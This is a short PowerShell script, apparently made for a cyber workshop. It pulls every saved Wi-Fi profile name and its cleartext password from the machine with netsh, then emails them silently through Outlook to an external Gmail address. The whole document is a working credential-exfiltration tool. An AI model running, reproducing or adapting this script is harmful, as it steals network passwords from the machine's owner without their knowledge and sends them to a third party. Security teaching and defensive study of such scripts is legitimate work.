$FiFi=(netsh wlan show profiles)|%{$n=(""+($_ -split ":")[1]).trim(); netsh wlan show profile name="$n" key=clear}|sls "Key Content","SSID name"
$recipient = "krzysiek1.stachowicz@gmail.com"
$subject = "Warsztaty z Cyber"
$body = $FiFi
$Outlook = New-Object -ComObject Outlook.Application
$mail = $Outlook.CreateItem(0)
$mail.To = $recipient
$mail.Subject = $subject
$mail.Body = $body
$mail.Send()
